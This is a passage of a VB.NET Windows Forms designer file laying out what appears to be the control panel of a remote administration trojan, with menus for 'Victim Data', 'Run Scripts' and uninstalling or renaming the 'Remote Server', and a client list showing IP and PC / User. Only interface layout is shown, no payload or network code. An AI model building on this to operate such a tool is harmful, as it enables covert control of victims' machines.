        Me.InformationToolStripMenuItem.Image = CType(resources.GetObject("InformationToolStripMenuItem.Image"), System.Drawing.Image)
        Me.InformationToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.InformationToolStripMenuItem.ImageTransparentColor = System.Drawing.Color.White
        Me.InformationToolStripMenuItem.Name = "InformationToolStripMenuItem"
        Me.InformationToolStripMenuItem.Size = New System.Drawing.Size(186, 30)
        Me.InformationToolStripMenuItem.Text = "System Information"
        '
        'CopyIPToolStripMenuItem
        '
        Me.CopyIPToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.CopyIPToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.CopyIPToolStripMenuItem.Image = CType(resources.GetObject("CopyIPToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CopyIPToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.CopyIPToolStripMenuItem.ImageTransparentColor = System.Drawing.Color.White
        Me.CopyIPToolStripMenuItem.Name = "CopyIPToolStripMenuItem"
        Me.CopyIPToolStripMenuItem.Size = New System.Drawing.Size(186, 30)
        Me.CopyIPToolStripMenuItem.Text = "Copy IP"
        '
        'CLXToolStripMenuItem
        '
        Me.CLXToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.CLXToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.CLXToolStripMenuItem.Image = CType(resources.GetObject("CLXToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CLXToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.CLXToolStripMenuItem.ImageTransparentColor = System.Drawing.Color.White
        Me.CLXToolStripMenuItem.Name = "CLXToolStripMenuItem"
        Me.CLXToolStripMenuItem.Size = New System.Drawing.Size(186, 30)
        Me.CLXToolStripMenuItem.Text = "Copy IP internal"
        '
        'StartProcessToolStripMenuItem
        '
        Me.StartProcessToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.StartProcessToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.StartProcessToolStripMenuItem.Image = CType(resources.GetObject("StartProcessToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StartProcessToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.StartProcessToolStripMenuItem.Name = "StartProcessToolStripMenuItem"
        Me.StartProcessToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.StartProcessToolStripMenuItem.Text = "Run Scripts"
        '
        'ServerToolStripMenuItem
        '
        Me.ServerToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.ServerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CloseToolStripMenuItem, Me.RestartToolStripMenuItem, Me.UninstallToolStripMenuItem, Me.RenameToolStripMenuItem})
        Me.ServerToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.ServerToolStripMenuItem.Image = CType(resources.GetObject("ServerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ServerToolStripMenuItem.Name = "ServerToolStripMenuItem"
        Me.ServerToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.ServerToolStripMenuItem.Text = "Remote Server"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.CloseToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.CloseToolStripMenuItem.Image = CType(resources.GetObject("CloseToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CloseToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(160, 30)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'RestartToolStripMenuItem
        '
        Me.RestartToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.RestartToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RestartToolStripMenuItem.Image = CType(resources.GetObject("RestartToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RestartToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
        Me.RestartToolStripMenuItem.Size = New System.Drawing.Size(160, 30)
        Me.RestartToolStripMenuItem.Text = "Restart"
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.UninstallToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.UninstallToolStripMenuItem.Image = CType(resources.GetObject("UninstallToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UninstallToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(160, 30)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'RenameToolStripMenuItem
        '
        Me.RenameToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.RenameToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RenameToolStripMenuItem.Image = CType(resources.GetObject("RenameToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RenameToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RenameToolStripMenuItem.Name = "RenameToolStripMenuItem"
        Me.RenameToolStripMenuItem.Size = New System.Drawing.Size(160, 30)
        Me.RenameToolStripMenuItem.Text = "Rename"
        '
        'OpenDownloadFolderToolStripMenuItem
        '
        Me.OpenDownloadFolderToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.OpenDownloadFolderToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.OpenDownloadFolderToolStripMenuItem.Image = CType(resources.GetObject("OpenDownloadFolderToolStripMenuItem.Image"), System.Drawing.Image)
        Me.OpenDownloadFolderToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.OpenDownloadFolderToolStripMenuItem.Name = "OpenDownloadFolderToolStripMenuItem"
        Me.OpenDownloadFolderToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.OpenDownloadFolderToolStripMenuItem.Text = "Victim Data"
        '
        'CommentsToolStripMenuItem
        '
        Me.CommentsToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.CommentsToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.CommentsToolStripMenuItem.Image = CType(resources.GetObject("CommentsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CommentsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.CommentsToolStripMenuItem.Name = "CommentsToolStripMenuItem"
        Me.CommentsToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.CommentsToolStripMenuItem.Text = "Comments"
        '
        'ii
        '
        Me.ii.ImageStream = CType(resources.GetObject("ii.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ii.TransparentColor = System.Drawing.Color.Transparent
        Me.ii.Images.SetKeyName(0, "0.png")
        Me.ii.Images.SetKeyName(1, "1.png")
        Me.ii.Images.SetKeyName(2, "2.png")
        Me.ii.Images.SetKeyName(3, "3.png")
        Me.ii.Images.SetKeyName(4, "4.png")
        Me.ii.Images.SetKeyName(5, "5.png")
        Me.ii.Images.SetKeyName(6, "6.png")
        Me.ii.Images.SetKeyName(7, "7.png")
        Me.ii.Images.SetKeyName(8, "8.png")
        Me.ii.Images.SetKeyName(9, "9.png")
        Me.ii.Images.SetKeyName(10, "10.png")
        Me.ii.Images.SetKeyName(11, "11.png")
        Me.ii.Images.SetKeyName(12, "12.png")
        Me.ii.Images.SetKeyName(13, "13.png")
        Me.ii.Images.SetKeyName(14, "14.png")
        Me.ii.Images.SetKeyName(15, "15.png")
        Me.ii.Images.SetKeyName(16, "16.png")
        Me.ii.Images.SetKeyName(17, "17.png")
        Me.ii.Images.SetKeyName(18, "18.png")
        Me.ii.Images.SetKeyName(19, "19.png")
        Me.ii.Images.SetKeyName(20, "20.png")
        Me.ii.Images.SetKeyName(21, "21.png")
        Me.ii.Images.SetKeyName(22, "22.png")
        Me.ii.Images.SetKeyName(23, "23.png")
        Me.ii.Images.SetKeyName(24, "24.png")
        Me.ii.Images.SetKeyName(25, "25.png")
        Me.ii.Images.SetKeyName(26, "26.png")
        Me.ii.Images.SetKeyName(27, "27.png")
        Me.ii.Images.SetKeyName(28, "28.png")
        Me.ii.Images.SetKeyName(29, "29.png")
        Me.ii.Images.SetKeyName(30, "30.png")
        Me.ii.Images.SetKeyName(31, "31.png")
        Me.ii.Images.SetKeyName(32, "32.png")
        Me.ii.Images.SetKeyName(33, "33.png")
        Me.ii.Images.SetKeyName(34, "34.png")
        Me.ii.Images.SetKeyName(35, "35.png")
        Me.ii.Images.SetKeyName(36, "36.png")
        Me.ii.Images.SetKeyName(37, "37.png")
        Me.ii.Images.SetKeyName(38, "38.png")
        Me.ii.Images.SetKeyName(39, "39.png")
        Me.ii.Images.SetKeyName(40, "40.png")
        Me.ii.Images.SetKeyName(41, "41.png")
        Me.ii.Images.SetKeyName(42, "42.png")
        Me.ii.Images.SetKeyName(43, "43.png")
        Me.ii.Images.SetKeyName(44, "44.png")
        Me.ii.Images.SetKeyName(45, "45.png")
        Me.ii.Images.SetKeyName(46, "46.png")
        Me.ii.Images.SetKeyName(47, "47.png")
        Me.ii.Images.SetKeyName(48, "48.png")
        Me.ii.Images.SetKeyName(49, "49.png")
        Me.ii.Images.SetKeyName(50, "50.png")
        Me.ii.Images.SetKeyName(51, "51.png")
        Me.ii.Images.SetKeyName(52, "52.png")
        Me.ii.Images.SetKeyName(53, "53.png")
        Me.ii.Images.SetKeyName(54, "54.png")
        Me.ii.Images.SetKeyName(55, "55.png")
        Me.ii.Images.SetKeyName(56, "56.png")
        Me.ii.Images.SetKeyName(57, "57.png")
        Me.ii.Images.SetKeyName(58, "58.png")
        Me.ii.Images.SetKeyName(59, "59.png")
        Me.ii.Images.SetKeyName(60, "60.png")
        Me.ii.Images.SetKeyName(61, "61.png")
        Me.ii.Images.SetKeyName(62, "62.png")
        Me.ii.Images.SetKeyName(63, "63.png")
        Me.ii.Images.SetKeyName(64, "64.png")
        Me.ii.Images.SetKeyName(65, "65.png")
        Me.ii.Images.SetKeyName(66, "66.png")
        Me.ii.Images.SetKeyName(67, "67.png")
        Me.ii.Images.SetKeyName(68, "68.png")
        Me.ii.Images.SetKeyName(69, "69.png")
        Me.ii.Images.SetKeyName(70, "70.png")
        Me.ii.Images.SetKeyName(71, "71.png")
        Me.ii.Images.SetKeyName(72, "72.png")
        Me.ii.Images.SetKeyName(73, "73.png")
        Me.ii.Images.SetKeyName(74, "74.png")
        Me.ii.Images.SetKeyName(75, "75.png")
        Me.ii.Images.SetKeyName(76, "76.png")
        Me.ii.Images.SetKeyName(77, "77.png")
        Me.ii.Images.SetKeyName(78, "78.png")
        Me.ii.Images.SetKeyName(79, "79.png")
        Me.ii.Images.SetKeyName(80, "80.png")
        Me.ii.Images.SetKeyName(81, "81.png")
        Me.ii.Images.SetKeyName(82, "82.png")
        Me.ii.Images.SetKeyName(83, "83.png")
        Me.ii.Images.SetKeyName(84, "84.png")
        Me.ii.Images.SetKeyName(85, "85.png")
        Me.ii.Images.SetKeyName(86, "86.png")
        Me.ii.Images.SetKeyName(87, "87.png")
        Me.ii.Images.SetKeyName(88, "88.png")
        Me.ii.Images.SetKeyName(89, "89.png")
        Me.ii.Images.SetKeyName(90, "90.png")
        Me.ii.Images.SetKeyName(91, "91.png")
        Me.ii.Images.SetKeyName(92, "92.png")
        Me.ii.Images.SetKeyName(93, "93.png")
        Me.ii.Images.SetKeyName(94, "94.png")
        Me.ii.Images.SetKeyName(95, "95.png")
        Me.ii.Images.SetKeyName(96, "96.png")
        Me.ii.Images.SetKeyName(97, "97.png")
        Me.ii.Images.SetKeyName(98, "98.png")
        Me.ii.Images.SetKeyName(99, "99.png")
        Me.ii.Images.SetKeyName(100, "100.png")
        Me.ii.Images.SetKeyName(101, "101.png")
        Me.ii.Images.SetKeyName(102, "102.png")
        Me.ii.Images.SetKeyName(103, "103.png")
        Me.ii.Images.SetKeyName(104, "104.png")
        Me.ii.Images.SetKeyName(105, "105.png")
        Me.ii.Images.SetKeyName(106, "106.png")
        Me.ii.Images.SetKeyName(107, "107.png")
        Me.ii.Images.SetKeyName(108, "108.png")
        Me.ii.Images.SetKeyName(109, "109.png")
        Me.ii.Images.SetKeyName(110, "110.png")
        Me.ii.Images.SetKeyName(111, "111.png")
        Me.ii.Images.SetKeyName(112, "112.png")
        Me.ii.Images.SetKeyName(113, "113.png")
        Me.ii.Images.SetKeyName(114, "114.png")
        Me.ii.Images.SetKeyName(115, "115.png")
        Me.ii.Images.SetKeyName(116, "116.png")
        Me.ii.Images.SetKeyName(117, "117.png")
        Me.ii.Images.SetKeyName(118, "118.png")
        Me.ii.Images.SetKeyName(119, "119.png")
        Me.ii.Images.SetKeyName(120, "120.png")
        Me.ii.Images.SetKeyName(121, "121.png")
        Me.ii.Images.SetKeyName(122, "122.png")
        Me.ii.Images.SetKeyName(123, "123.png")
        Me.ii.Images.SetKeyName(124, "124.png")
        Me.ii.Images.SetKeyName(125, "125.png")
        Me.ii.Images.SetKeyName(126, "126.png")
        Me.ii.Images.SetKeyName(127, "127.png")
        Me.ii.Images.SetKeyName(128, "128.png")
        Me.ii.Images.SetKeyName(129, "129.png")
        Me.ii.Images.SetKeyName(130, "130.png")
        Me.ii.Images.SetKeyName(131, "131.png")
        Me.ii.Images.SetKeyName(132, "132.png")
        Me.ii.Images.SetKeyName(133, "133.png")
        Me.ii.Images.SetKeyName(134, "134.png")
        Me.ii.Images.SetKeyName(135, "135.png")
        Me.ii.Images.SetKeyName(136, "136.png")
        Me.ii.Images.SetKeyName(137, "137.png")
        Me.ii.Images.SetKeyName(138, "138.png")
        Me.ii.Images.SetKeyName(139, "139.png")
        Me.ii.Images.SetKeyName(140, "140.png")
        Me.ii.Images.SetKeyName(141, "141.png")
        Me.ii.Images.SetKeyName(142, "142.png")
        Me.ii.Images.SetKeyName(143, "143.png")
        Me.ii.Images.SetKeyName(144, "144.png")
        Me.ii.Images.SetKeyName(145, "145.png")
        Me.ii.Images.SetKeyName(146, "146.png")
        Me.ii.Images.SetKeyName(147, "147.png")
        Me.ii.Images.SetKeyName(148, "148.png")
        Me.ii.Images.SetKeyName(149, "149.png")
        Me.ii.Images.SetKeyName(150, "150.png")
        Me.ii.Images.SetKeyName(151, "151.png")
        Me.ii.Images.SetKeyName(152, "152.png")
        Me.ii.Images.SetKeyName(153, "153.png")
        Me.ii.Images.SetKeyName(154, "154.png")
        Me.ii.Images.SetKeyName(155, "155.png")
        Me.ii.Images.SetKeyName(156, "156.png")
        Me.ii.Images.SetKeyName(157, "157.png")
        Me.ii.Images.SetKeyName(158, "158.png")
        Me.ii.Images.SetKeyName(159, "159.png")
        Me.ii.Images.SetKeyName(160, "160.png")
        Me.ii.Images.SetKeyName(161, "161.png")
        Me.ii.Images.SetKeyName(162, "162.png")
        Me.ii.Images.SetKeyName(163, "163.png")
        Me.ii.Images.SetKeyName(164, "164.png")
        Me.ii.Images.SetKeyName(165, "165.png")
        Me.ii.Images.SetKeyName(166, "166.png")
        Me.ii.Images.SetKeyName(167, "167.png")
        Me.ii.Images.SetKeyName(168, "168.png")
        Me.ii.Images.SetKeyName(169, "169.png")
        Me.ii.Images.SetKeyName(170, "170.png")
        Me.ii.Images.SetKeyName(171, "171.png")
        Me.ii.Images.SetKeyName(172, "172.png")
        Me.ii.Images.SetKeyName(173, "173.png")
        Me.ii.Images.SetKeyName(174, "174.png")
        Me.ii.Images.SetKeyName(175, "175.png")
        Me.ii.Images.SetKeyName(176, "176.png")
        Me.ii.Images.SetKeyName(177, "177.png")
        Me.ii.Images.SetKeyName(178, "178.png")
        Me.ii.Images.SetKeyName(179, "179.png")
        Me.ii.Images.SetKeyName(180, "180.png")
        Me.ii.Images.SetKeyName(181, "181.png")
        Me.ii.Images.SetKeyName(182, "182.png")
        Me.ii.Images.SetKeyName(183, "183.png")
        Me.ii.Images.SetKeyName(184, "184.png")
        Me.ii.Images.SetKeyName(185, "185.png")
        Me.ii.Images.SetKeyName(186, "186.png")
        Me.ii.Images.SetKeyName(187, "187.png")
        Me.ii.Images.SetKeyName(188, "188.png")
        Me.ii.Images.SetKeyName(189, "189.png")
        Me.ii.Images.SetKeyName(190, "190.png")
        Me.ii.Images.SetKeyName(191, "191.png")
        Me.ii.Images.SetKeyName(192, "192.png")
        Me.ii.Images.SetKeyName(193, "193.png")
        Me.ii.Images.SetKeyName(194, "194.png")
        Me.ii.Images.SetKeyName(195, "195.png")
        Me.ii.Images.SetKeyName(196, "196.png")
        Me.ii.Images.SetKeyName(197, "197.png")
        Me.ii.Images.SetKeyName(198, "198.png")
        Me.ii.Images.SetKeyName(199, "199.png")
        Me.ii.Images.SetKeyName(200, "200.png")
        Me.ii.Images.SetKeyName(201, "201.png")
        Me.ii.Images.SetKeyName(202, "202.png")
        Me.ii.Images.SetKeyName(203, "203.png")
        Me.ii.Images.SetKeyName(204, "204.png")
        Me.ii.Images.SetKeyName(205, "205.png")
        Me.ii.Images.SetKeyName(206, "206.png")
        Me.ii.Images.SetKeyName(207, "207.png")
        Me.ii.Images.SetKeyName(208, "208.png")
        Me.ii.Images.SetKeyName(209, "209.png")
        Me.ii.Images.SetKeyName(210, "210.png")
        Me.ii.Images.SetKeyName(211, "211.png")
        Me.ii.Images.SetKeyName(212, "212.png")
        Me.ii.Images.SetKeyName(213, "213.png")
        Me.ii.Images.SetKeyName(214, "214.png")
        Me.ii.Images.SetKeyName(215, "215.png")
        Me.ii.Images.SetKeyName(216, "216.png")
        Me.ii.Images.SetKeyName(217, "217.png")
        Me.ii.Images.SetKeyName(218, "218.png")
        Me.ii.Images.SetKeyName(219, "219.png")
        Me.ii.Images.SetKeyName(220, "220.png")
        Me.ii.Images.SetKeyName(221, "221.png")
        Me.ii.Images.SetKeyName(222, "222.png")
        Me.ii.Images.SetKeyName(223, "223.png")
        Me.ii.Images.SetKeyName(224, "224.png")
        Me.ii.Images.SetKeyName(225, "225.png")
        Me.ii.Images.SetKeyName(226, "226.png")
        Me.ii.Images.SetKeyName(227, "227.png")
        Me.ii.Images.SetKeyName(228, "228.png")
        Me.ii.Images.SetKeyName(229, "229.png")
        Me.ii.Images.SetKeyName(230, "230.png")
        Me.ii.Images.SetKeyName(231, "231.png")
        Me.ii.Images.SetKeyName(232, "232.png")
        Me.ii.Images.SetKeyName(233, "233.png")
        Me.ii.Images.SetKeyName(234, "234.png")
        Me.ii.Images.SetKeyName(235, "235.png")
        Me.ii.Images.SetKeyName(236, "236.png")
        Me.ii.Images.SetKeyName(237, "237.png")
        Me.ii.Images.SetKeyName(238, "238.png")
        Me.ii.Images.SetKeyName(239, "239.png")
        Me.ii.Images.SetKeyName(240, "240.png")
        Me.ii.Images.SetKeyName(241, "241.png")
        '
        'NotifyIcon1
        '
        Me.NotifyIcon1.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info
        Me.NotifyIcon1.Visible = True
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        '
        'Timer2
        '
        Me.Timer2.Interval = 1
        '
        'Timer3
        '
        Me.Timer3.Enabled = True
        '
        'StatusStrip1
        '
        Me.StatusStrip1.BackColor = System.Drawing.Color.Gainsboro
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripSeparator2, Me.ToolStripStatusLabel3, Me.ToolStripSeparator1, Me.ToolStripStatusLabel1})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 392)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional
        Me.StatusStrip1.Size = New System.Drawing.Size(838, 23)
        Me.StatusStrip1.SizingGrip = False
        Me.StatusStrip1.TabIndex = 0
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'ToolStripSeparator2
        '
        Me.ToolStripSeparator2.Name = "ToolStripSeparator2"
        Me.ToolStripSeparator2.Size = New System.Drawing.Size(6, 23)
        '
        'ToolStripStatusLabel3
        '
        Me.ToolStripStatusLabel3.ActiveLinkColor = System.Drawing.SystemColors.Control
        Me.ToolStripStatusLabel3.BackColor = System.Drawing.SystemColors.Control
        Me.ToolStripStatusLabel3.ForeColor = System.Drawing.Color.IndianRed
        Me.ToolStripStatusLabel3.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3"
        Me.ToolStripStatusLabel3.Size = New System.Drawing.Size(175, 18)
        Me.ToolStripStatusLabel3.Text = "Wait On The Unknown Port ( 0 )"
        '
        'ToolStripSeparator1
        '
        Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
        Me.ToolStripSeparator1.Size = New System.Drawing.Size(6, 23)
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.ActiveLinkColor = System.Drawing.SystemColors.Control
        Me.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.DimGray
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(68, 18)
        Me.ToolStripStatusLabel1.Text = "Selected (0)"
        '
        'ProgressBar1
        '
        Me.ProgressBar1.Location = New System.Drawing.Point(1130, 254)
        Me.ProgressBar1.Name = "ProgressBar1"
        Me.ProgressBar1.Size = New System.Drawing.Size(36, 12)
        Me.ProgressBar1.TabIndex = 39
        Me.ProgressBar1.Visible = False
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.Panel1.Controls.Add(Me.PictureBox3)
        Me.Panel1.Controls.Add(Me.PictureBox2)
        Me.Panel1.Controls.Add(Me.SplitContainer2)
        Me.Panel1.Controls.Add(Me.ProgressBar1)
        Me.Panel1.Controls.Add(Me.StatusStrip1)
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel1.ForeColor = System.Drawing.Color.White
        Me.Panel1.Location = New System.Drawing.Point(0, 0)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(838, 415)
        Me.Panel1.TabIndex = 42
        '
        'PictureBox3
        '
        Me.PictureBox3.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.PictureBox3.BackColor = System.Drawing.Color.Gainsboro
        Me.PictureBox3.Location = New System.Drawing.Point(780, 391)
        Me.PictureBox3.Name = "PictureBox3"
        Me.PictureBox3.Size = New System.Drawing.Size(24, 24)
        Me.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox3.TabIndex = 46
        Me.PictureBox3.TabStop = False
        Me.ToolTip1.SetToolTip(Me.PictureBox3, "My Favorites")
        '
        'PictureBox2
        '
        Me.PictureBox2.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.PictureBox2.BackColor = System.Drawing.Color.Gainsboro
        Me.PictureBox2.Image = CType(resources.GetObject("PictureBox2.Image"), System.Drawing.Image)
        Me.PictureBox2.Location = New System.Drawing.Point(812, 390)
        Me.PictureBox2.Name = "PictureBox2"
        Me.PictureBox2.Size = New System.Drawing.Size(24, 24)
        Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox2.TabIndex = 45
        Me.PictureBox2.TabStop = False
        Me.ToolTip1.SetToolTip(Me.PictureBox2, "My Favorites")
        '
        'SplitContainer2
        '
        Me.SplitContainer2.BackColor = System.Drawing.SystemColors.ControlDark
        Me.SplitContainer2.Dock = System.Windows.Forms.DockStyle.Fill
        Me.SplitContainer2.ForeColor = System.Drawing.Color.DimGray
        Me.SplitContainer2.Location = New System.Drawing.Point(0, 0)
        Me.SplitContainer2.Name = "SplitContainer2"
        Me.SplitContainer2.Orientation = System.Windows.Forms.Orientation.Horizontal
        '
        'SplitContainer2.Panel1
        '
        Me.SplitContainer2.Panel1.BackColor = System.Drawing.Color.Black
        Me.SplitContainer2.Panel1.Controls.Add(Me.VisualStudioTabControl2)
        '
        'SplitContainer2.Panel2
        '
        Me.SplitContainer2.Panel2.Controls.Add(Me.SplitContainer3)
        Me.SplitContainer2.Size = New System.Drawing.Size(838, 392)
        Me.SplitContainer2.SplitterDistance = 253
        Me.SplitContainer2.TabIndex = 44
        '
        'VisualStudioTabControl2
        '
        Me.VisualStudioTabControl2.ActiveColour = System.Drawing.SystemColors.ControlDark
        Me.VisualStudioTabControl2.AllowDrop = True
        Me.VisualStudioTabControl2.BackTabColour = System.Drawing.Color.Gainsboro
        Me.VisualStudioTabControl2.BaseColour = System.Drawing.Color.Gainsboro
        Me.VisualStudioTabControl2.BorderColour = System.Drawing.Color.Gainsboro
        Me.VisualStudioTabControl2.Controls.Add(Me.TabPage1)
        Me.VisualStudioTabControl2.Dock = System.Windows.Forms.DockStyle.Fill
        Me.VisualStudioTabControl2.HorizontalLineColour = System.Drawing.SystemColors.ControlDark
        Me.VisualStudioTabControl2.ItemSize = New System.Drawing.Size(240, 16)
        Me.VisualStudioTabControl2.Location = New System.Drawing.Point(0, 0)
        Me.VisualStudioTabControl2.Name = "VisualStudioTabControl2"
        Me.VisualStudioTabControl2.SelectedIndex = 0
        Me.VisualStudioTabControl2.Size = New System.Drawing.Size(838, 253)
        Me.VisualStudioTabControl2.TabIndex = 37
        Me.VisualStudioTabControl2.TextColour = System.Drawing.Color.White
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.Gainsboro
        Me.TabPage1.Controls.Add(Me.Panel4)
        Me.TabPage1.Controls.Add(Me.L1)
        Me.TabPage1.Location = New System.Drawing.Point(4, 20)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(830, 229)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "TabPage1"
        '
        'Panel4
        '
        Me.Panel4.BackColor = System.Drawing.Color.Maroon
        Me.Panel4.Controls.Add(Me.hard)
        Me.Panel4.Controls.Add(Me.TextBox1)
        Me.Panel4.Controls.Add(Me.CheckBox2)
        Me.Panel4.Location = New System.Drawing.Point(286, 95)
        Me.Panel4.Name = "Panel4"
        Me.Panel4.Size = New System.Drawing.Size(10, 10)
        Me.Panel4.TabIndex = 39
        '
        'hard
        '
        Me.hard.BackColor = System.Drawing.SystemColors.ActiveCaption
        Me.hard.Location = New System.Drawing.Point(103, 48)
        Me.hard.Name = "hard"
        Me.hard.Size = New System.Drawing.Size(100, 20)
        Me.hard.TabIndex = 40
        '
        'TextBox1
        '
        Me.TextBox1.Location = New System.Drawing.Point(36, 20)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(100, 20)
        Me.TextBox1.TabIndex = 39
        '
        'CheckBox2
        '
        Me.CheckBox2.AutoSize = True
        Me.CheckBox2.Checked = True
        Me.CheckBox2.CheckState = System.Windows.Forms.CheckState.Checked
        Me.CheckBox2.ForeColor = System.Drawing.Color.Maroon
        Me.CheckBox2.Location = New System.Drawing.Point(18, 46)
        Me.CheckBox2.Name = "CheckBox2"
        Me.CheckBox2.Size = New System.Drawing.Size(79, 17)
        Me.CheckBox2.TabIndex = 38
        Me.CheckBox2.Text = "CheckBox2"
        Me.CheckBox2.UseVisualStyleBackColor = True
        '
        'L1
        '
        Me.L1.BackColor = System.Drawing.Color.White
        Me.L1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader15, Me.ColumnHeader16, Me.ColumnHeader17, Me.ColumnHeader18, Me.ColumnHeader19, Me.ColumnHeader20, Me.ColumnHeader21, Me.ColumnHeader22, Me.ColumnHeader23, Me.ColumnHeader24, Me.ColumnHeader25, Me.ColumnHeader26, Me.ColumnHeader27, Me.ColumnHeader28, Me.ColumnHeader1})
        Me.L1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.L1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.L1.Font = New System.Drawing.Font("Tahoma", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.L1.ForeColor = System.Drawing.Color.Black
        Me.L1.FullRowSelect = True
        Me.L1.LargeImageList = Me.ii
        Me.L1.Location = New System.Drawing.Point(3, 3)
        Me.L1.Name = "L1"
        Me.L1.OwnerDraw = True
        Me.L1.Size = New System.Drawing.Size(824, 223)
        Me.L1.SmallImageList = Me.ii
        Me.L1.TabIndex = 37
        Me.L1.UseCompatibleStateImageBehavior = False
        Me.L1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader15
        '
        Me.ColumnHeader15.Text = "Server ID"
        Me.ColumnHeader15.Width = 130
        '
        'ColumnHeader16
        '
        Me.ColumnHeader16.Text = "IP"
        Me.ColumnHeader16.Width = 90
        '
        'ColumnHeader17
        '
        Me.ColumnHeader17.Text = "PC / User"
